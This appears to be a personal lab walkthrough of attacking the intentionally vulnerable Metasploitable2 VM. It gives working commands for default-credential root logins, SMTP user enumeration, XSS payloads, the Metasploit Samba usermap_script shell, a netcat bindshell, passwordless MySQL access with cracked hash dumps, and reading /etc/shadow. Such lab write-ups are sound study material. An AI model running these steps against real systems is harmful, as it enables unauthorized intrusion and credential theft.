# Metasploitable2 Walkthrough – How I Got Root on Every Port

**Target:** Metasploitable2 (192.168.66.2)
**Attacker:** Kali Linux in UTM
**Difficulty:** Beginner

So I've been learning CTFs and decided to go through Metasploitable2, which is basically a purposely vulnerable VM made for practicing pentesting. The goal was simple: get root access through as many services as possible. Here's how it went.

---

## Recon – What Are We Working With?

First things first, let's see what's running:

```bash
nmap -sV -sC 192.168.66.2
```

This gave me a ton of open ports. Metasploitable2 is basically swiss cheese, pretty much everything is exploitable. Let's go through them one by one.

---

## Port 21 – FTP (vsftpd 2.3.4)

First thing I always try with FTP is anonymous login:

```bash
ftp 192.168.66.2
# Username: anonymous
# Password: (just hit enter)
```

Got in, but the directory was completely empty so nothing useful here. Anonymous FTP access is still a finding worth noting though. Also worth mentioning that this version (vsftpd 2.3.4) has a famous backdoor that I'll come back to later with searchsploit.

---

## Port 22 – SSH (OpenSSH 4.7)

Tried the default Metasploitable2 credentials:

```bash
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa -oMACs=+hmac-sha1 msfadmin@192.168.66.2
# Password: msfadmin
```

The extra flags are needed because modern Kali doesn't support the old crypto algorithms that this ancient SSH version uses. Got the hint straight from the error message and looked it up. Once in, just ran:

```bash
sudo su
```

Root. Done. Took maybe 30 seconds total.

---

## Port 23 – Telnet

Same idea as SSH, just way less secure because everything goes over plaintext:

```bash
telnet 192.168.66.2
# Login: msfadmin
# Password: msfadmin
```

Then `sudo su` again for root. In a real network anyone sniffing traffic with Wireshark would see these credentials fly by in plain text. That's how bad Telnet is.

---

## Port 25 – SMTP (Postfix)

This one isn't about getting root directly, it's about figuring out which users exist on the system. The VRFY command lets you check if a username is valid:

```bash
nc 192.168.66.2 25
HELO test
VRFY root        # 252 = user exists
VRFY msfadmin    # 252 = user exists
VRFY fakeuser    # error = doesn't exist
QUIT
```

You can also automate this with smtp-user-enum:

```bash
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 192.168.66.2
```

This gives you a list of valid usernames that you can then throw at SSH or Telnet for brute forcing. No direct root here but super useful for recon because you're building a target list for later attacks.

---

## Port 80 – Apache (HTTP)

Ran gobuster to find hidden directories:

```bash
gobuster dir -u http://192.168.66.2 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

Found phpMyAdmin, DVWA, a WebDAV endpoint, phpinfo.php and a few other things. DVWA logged in straight away with `admin:password`. Tested some XSS payloads in the input fields just to confirm they worked:

```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
```

phpMyAdmin was accessible but the web login was a bit annoying so I skipped it and went straight to MySQL on port 3306 instead.

---

## Port 139/445 – Samba 3.0.20

This is one of the most well known Metasploitable2 exploits. Samba 3.0.20 has a command injection vulnerability in the username field (CVE-2007-2447). Checked the available shares first:

```bash
smbclient -L //192.168.66.2 -N
```

Then went straight into Metasploit:

```bash
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.66.2
set LHOST 192.168.67.2
exploit
```

```
[*] Command shell session 1 opened
whoami
root
```

What's happening here is that Metasploit sends a username with shell metacharacters in it. Samba passes it straight to `/bin/sh` without sanitizing anything, so the injected command runs as root. After getting the shell I upgraded it to a proper TTY:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

This gives you tab completion, a proper prompt, and the ability to use commands like `su` that need a real terminal. Without this upgrade you're stuck with a bare bones shell where stuff randomly breaks.

---

## Port 1524 – Bindshell

This one is almost embarrassing. nmap literally told me:

```
1524/tcp open  bindshell   Metasploitable root shell
```

A root shell just sitting wide open on port 1524. No exploit needed, no credentials, nothing:

```bash
nc 192.168.66.2 1524
```

That's it, you're root. One command. In a real scenario this would be a backdoor left by a previous attacker. The lesson here is to always read your nmap output carefully because it basically handed me root for free.

---

## Port 3306 – MySQL

Connected directly to MySQL without any password:

```bash
mysql -h 192.168.66.2 -u root --skip-ssl
```

The `--skip-ssl` flag was needed because the modern MySQL client kept trying to negotiate TLS with this ancient server. Once in I dumped the DVWA user hashes:

```sql
USE dvwa;
SELECT * FROM users;
```

| User | Hash (MD5) | Cracked |
|---|---|---|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 | password |
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 | password |
| gordonb | e99a18c428cb38d5f260853678922e03 | abc123 |
| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b | charley |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 | letmein |

Threw the hashes into CrackStation and they all cracked instantly. These are unsalted MD5 hashes which is the weakest form of password storage. Any hash cracking site or even a rainbow table will crack them in seconds.

Also found that the `guest` user had ALL privileges including `CREATE USER`, `DROP` and `SHUTDOWN` which is a disaster. In a real engagement you could create your own admin user, drop databases, or just shut the whole server down.

From the Samba root shell I also grabbed the system password hashes:

```bash
cat /etc/shadow
```

Got MD5crypt hashes for msfadmin, klog, postgres, user and service accounts. These are stronger than the plain MD5 web hashes but still crackable with hashcat or john. The `$1$` prefix tells you it's MD5crypt.

---

## What I Learned

Default credentials and unpatched software are the easiest wins in pentesting. SSH, Telnet, DVWA and MySQL all fell without any real effort because nobody changed the defaults. The Samba exploit was a bit more involved but still just a couple of commands in Metasploit.

Reading nmap output carefully matters more than I expected. Port 1524 was literally labeled "root shell" in the scan results and I almost skipped past it. Now I read every line.

Linux handles passwords in two files. `/etc/passwd` is readable by everyone and just has an `x` where the password used to be. The actual hashes live in `/etc/shadow` which only root can read. So getting root first and then reading shadow is the play. The hash format tells you the algorithm too. `$1$` is MD5crypt, `$5$` is SHA-256, `$6$` is SHA-512.

Upgrading shells with `python -c 'import pty; pty.spawn("/bin/bash")'` is something I do every single time now. A raw netcat shell is painful to work with.

The SMTP user enumeration trick is underrated. You might not get root directly from it but building a list of valid usernames makes everything else easier. You go from guessing to targeted attacks.

---

## Still on the List

**Port 5900 (VNC)** probably has weak or default credentials. VNC is a remote desktop protocol so if I get in I'd have full GUI access to the machine.

**Port 6667 (UnrealIRCd)** has a known backdoor in certain versions. Similar to the vsftpd backdoor, someone injected malicious code into the source before it was distributed. Should be exploitable with Metasploit.

**Port 8180 (Tomcat)** is a Java web server that almost always has default credentials on the manager interface. If you can access the manager you can deploy a malicious WAR file and get code execution.

**vsftpd 2.3.4 backdoor** on port 21 is the famous one where if you send a username ending in `:)` (a smiley face) it opens a shell on port 6200. One of the most well known backdoors in security history.

Will come back and hit all of these.

---

*Educational purposes only. Metasploitable2 is a deliberately vulnerable VM. Don't run any of this on systems you don't own.*
